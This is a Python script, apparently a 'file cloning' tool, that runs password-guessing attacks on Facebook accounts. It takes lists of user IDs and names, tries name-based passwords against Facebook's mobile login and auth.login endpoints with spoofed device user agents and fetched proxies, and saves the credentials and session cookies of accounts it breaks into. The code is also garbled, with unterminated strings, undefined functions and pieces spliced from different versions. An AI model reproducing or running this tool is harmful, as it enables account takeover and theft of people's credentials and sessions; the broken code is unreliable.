###-------------------### MODULES ###-----------------###
import os



try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    from os import path,system
    import bs4
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python TEST.py')

import random
try:
   os.mkdir('/sdcard/TEST')
except:pass
def linex():
        print(f'{W}-----------------------------------------------{W}')




try:
    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
    open('proxies.txt','w').write(prox)
except Exception as e:
    print('')
proxies=open('proxies.txt','r').read().splitlines()

princp=[]

###-------------------### VARIABLES ###----------------###
_F = "/sdcard/Cell/"
_D = "clear"
_B = "\n"
_A = "bold yellow"

try:
    os.makedirs(_F)
except:
    pass
sntxfldr = _F

cmd(_D)


###-------------------### DATE TIME CHECKER ###-------------###
script_status = "PREM
months_check = {
    "1": "January",
    "2": "February",
    "3": "March",
    "4": "April",
    "5": "May",
    "6": "June",
    "7": "July",
    "8": "August",
    "9": "September",
    "10": "October",
    "11": "November",
    "12": "December",
}
date_now = datetime.datetime.now().day
month_now = months_check[str(datetime.datetime.now().month)]
date_month = str(month_now) + "-" + str(date_now)

###-------------------### LOGO ###------------------------###
logo=("""\033[1;37m
  .d8b.  db   dD d888888b d8b   db  d888b 
 d8' `8b 88 ,8P'   `88'   888o  88 88' Y8b
 88ooo88 88,8P      88    88V8o 88 88       \033[1;34m𝐏 \033[1;37m
 88~~~88 88`8b      88    88 V8o88 88  ooo.\033[1;31m 𝐑\033[1;37m
 88   88 88 `88.   .88.   88  V888 88. ~8~  \033[1;35m𝐎 \033[1;37m
 YP   YP YP   YD Y888888P VP   V8P  Y888P   
----------------------------------------------
 Author    : CJ
 Github    : Hiroshi
 Facebook  : Simón Trinidad
 Tool Name : CELL
 Type type :  Free
 Version   : 0.1
----------------------------------------------
 SHAMI Pro version 1.9.8
 For Haters: OKAT SA BAHAR
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)
###-------------------### MENU ###------------------------###
def sintx_menu():
    B = "[sky_blue1][1] FILE CLONING\n[0] REPORT ERROR"
    sintx_logo()
    prnt(pnl(B, width=90, style=_A, title="OPTIONS"))
    A = input(f"{green}  [?] OPTION:{dark_gray} ")
    if A == "1":
        ク克隆()
    if A == "0":
        cmd("xdg-open https://m.me/61553865513324")
        cell_menu()
    else:
        アニメ(f"{ro}  [!] INVALID INPUT")
        cell_menu()

###-------------------### FILE CLONING ###--------------------###
loop = 0
oks = []
cps = []
twf = []
ugen = []


def ク克隆():
    sintx_logo()
    E = "/sdcard/"
    prnt(pnl("[yellow][»] ENTER NAME OF YOUR FILE", width=90, style=_A))
    F = input(f"{green}  [+] /sdcard/:{dark_gray} ")
    G = E + F
    try:
        B = open(G, "r").read().splitlines()
    except FileNotFoundError:
        cd(1)
        print(f"\n{lr}  [X] FILE NOT FOUND")
        cd(3)
        ク克隆()
    A = []
    prnt(
        pnl(
            "[sky_blue1][1] SYSTEM PASSWORD LIST\n[2] YOUR PASSWORD LIST",
            width=90,
            style=_A,
            title="SELECT PASSWORD METHOD",
        )
    )
    H = input(f"{green}  [›] CHOICE:{dark_gray} ")
    if H in ["1", "01"]:
        A.append("first last")
        A.append("first123")
        A.append("first12")
        A.append("first143")
        A.append("first12345")
        A.append("first123456")
        A.append("first_123")
        A.append("maganda")
        A.append("magandaako")
        A.append("gandako")
        A.append("ganda")
        A.append("cuteako")
        A.append("god143")
        A.append("i love you")
        A.append("firstpretty")
        A.append("firstpogi")
        A.append("firstigop")
        A.append("firstdump")
        A.append("potanginamo")
        A.append("lastlast")
        A.append("firstfirst")
        A.append("firstganda")
        A.append("firstmaganda")
        A.append("blackpink")
        A.append("jungkook")
        A.append("pogiko")
        A.append("pogiako")
    else:
        try:
            prnt(
                pnl(
                    "[yellow][?] HOW MANY PASSWORD DO YOU WANT TO USE?",
                    width=90,
                    style=_A,
                )
            )
            C = int(input(f"{green}  [›] ANSWER:{dark_gray} "))
        except:
            C = 1
        prnt(
            pnl(
                "[yellow] first last, first123, first143, last123, last143",
                width=90,
                style=_A,
                title="EXAMPLE PASSWORD",
            )
        )
        for I in range(C):
            A.append(input(f"{green}  [›] PASSWORD #{I+1}:{dark_gray} "))
    with ThreadPool(max_workers=None) as J:
        prnt(
            pnl(
                "[yellow][»] ON/OFF FIRST YOUR DATA FOR 5 SECONDS AND PRESS ENTER",
                width=90,
                style=_A,
                title="INSTRUCTIONS",
            )
        )
        input(f"{green}  [»] PRESS ENTER: ")
        sintx_logo()
        D = str(len(B))
        prnt(
            pnl(
                "[yellow][»] NOT FOR SALE!",
                width=90,
                style=_A,
                title="NOTICE!",
            )
        )
        K = "[white][-] TOTAL IDS TO CLONE: " + D + "\n[-] RESULT PATH: SINTX FOLDER"
        prnt(pnl(K, width=90, style=_A, title="FILE INFO"))
        for L in B:
            M, N = L.split("|")
            O = A
            J.submit(sinsAPI_, M, N, O, D)
    P = "[»] HITS : " + str(len(oks))
    Q = "\n[»] CPS  : " + str(len(cps))
    print(_B)
    prnt(pnl(P + Q, width=90, style=_A, title="PROCESS COMPLETED"))
    input(f"{dark_gray}  [›] PRESS ENTER TO REFRESH ")
    sintx_menu()
###------------------### API (MBASIC) ###-------------------###


def sinsAPI_(uid, names, pxss_, tot4l):
    F = names
    A = uid
    global loop, oks, cps
    sys.stdout.write(
        f"\r\r{dark_gray}  [SINTX] %s/%s - OKS: %s - CPS: %s\r "
        % (loop, tot4l, len(oks), len(cps))
    )
    sys.stdout.flush()
    C = requests.Session()
    try:
        G = F.split(" ")[0]
        try:
            D = F.split(" ")[1]
        except:
            D = "143"
        L = G.lower()
        M = D.lower()
        for N in pxss_:
            B = (
                N.replace("First", G)
                .replace("Last", D)
                .replace("first", L)
                .replace("last", M)
            )
            header = {
                "authority": "m.facebook.com",
                "method": "GET",
                "scheme": "https",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=1",
                "cache-control": "no-cache, no-store, must-revalidate",
                "referer": "https://m.facebook.com/",
                "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "Android",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "pragma": "no-cache",
                "priority": "u=1",
                "cross-origin-resource-policy": "cross-origin",
                "upgrade-insecure-requests": "1",
                "user-agent": str(PyBookAgents.random_ugen()),
            }
            I = C.get(
                f"https://m.facebook.com/login/device-based/password/?uid={A}&flow=login_no_pin&refsrc=deprecated&_rdr"
            )
            S = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(I.text)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(I.text)).group(
                    1
                ),
                "uid": A,
                "next": "https://mbasic.facebook.com/login/save-device/",
                "flow": "login_no_pin",
                "pass": B,
            }
            C.post(
                "https://m.facebook.com/login/device-based/validate-password/?shbl=0",
                data=S,
                allow_redirects=False,
                headers=header,
            ).text
            J = C.cookies.get_dict().keys()
            if "c_user" in J:
                K = ";".join(
                    ["%s=%s" % (A, B) for (A, B) in C.cookies.get_dict().items()]
                )
                open(sntxfldr + f"HITS-{date_month}.txt", "a").write(
                    A + "|" + B + "~" + Scrape_Year(uid) + _B + K + "\n\n"
                )
                print(_B)
                T = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
                E = pnl(
                    T, width=90, style="bold pale_turquoise1", title="SINTX SUCCESSFUL"
                )
                prnt(E)
                oks.append(A)
                break
            elif "checkpoint" in J:
                cps.append(A)
                print(_B)
                U = f"[white]UID  : {A}\nPASS : {B}\nYEAR : {Scrape_Year(uid)}"
                E = pnl(U, width=90, style="bold red", title="SINTX CHECKPOINT")
                prnt(E)
                open(sntxfldr + f"CPS-{date_month}.txt", "a").write(
                    A + "|" + B + "~" + Scrape_Year(uid) + _B
                )
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20
###------------------### START ###-----------------------###
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass
menu()

###----------------### DEF ###-------------------------###
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r %s M1 । :%s'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        user_agento = f"Dalvik/2.1.0 Linux; U; Android "+str(random.randrange(5,14))+"; "+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+" Build/QP1A."+str(random.randrange(111111,999999))+") [FBAN/FB4A;FBAV/"+str(random.randint(199,399))+".0.0."+str(random.randint(1,9))+"."+str(random.randint(99,199))+";FBBV/"+str(random.randint(111111111,999999999))+";FBDM/{density="+str(random.randint(2,3))+"."+str(random.randint(2,5))+",width=1080,height="+str(random.randint(1400,1499))+"};FBLC/"+str(random.choice(["cs_CZ","en_GB","en_US","lt_LT","pl_PL","id_ID","ru_RU","pt_PT","he_IL","hi_IN","nl_NL"," it_IT","en_IN","es_ES","en_PK"]))+";FBCR/"+str(random.choice(["Tele2You","Telenor","FASTWEB","Banglalink","Sprint","Jazz","Vodafone IN","Vi India","Tele2 LT","Jio 4G","EE","Oi","MtelBG","AT&amp;amp-T","Ufone","Azercell"]))+";FBMF/Xiaomi;FBBD/"+str(random.choice(["Xiaomi","Xiaomi","Redmi"]))+";FBPN/com.facebook.katana;FBDV/"+str(random.choice(["M2101K7AG","M2003J15SC","M2004J19C","M2006C3LG","M2007J20CG","M2010J19CG","M2011K2C","M2012K11AG","M2101K7BG","M2101K9G","M2102J20SG","M2102K1G","M2003J15SC","MI MAX 2","AT&amp;amp-T","Redmi Note 4", "Redmi 4X","Redmi Note 8 Pro","Redmi Note 5","Redmi Note 8T","Redmi 6A","Redmi 7A","MI PLAY","MI 8 Lite","Mi 9T","Mi A2 Lite"," Mi 9", "M2101K7AG"]))+";FBSV/"+str(random.randint(9,12))+";FBOP/1;FBCA/arm64-v8a:;]"
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'meta_inf_fbmeta':'',
                                'currently_logged_in_userid':'0',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua1(),
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://'+'api'+'.facebook.com/method/auth.login'
                       # twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r \033[1;32m<=>  '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'[🍪]{W}COOKIE : {G}'+coki)
                                        
                                        open('/sdcard/TEST/OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                      
                        
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
                
                
                
                
sys();main()

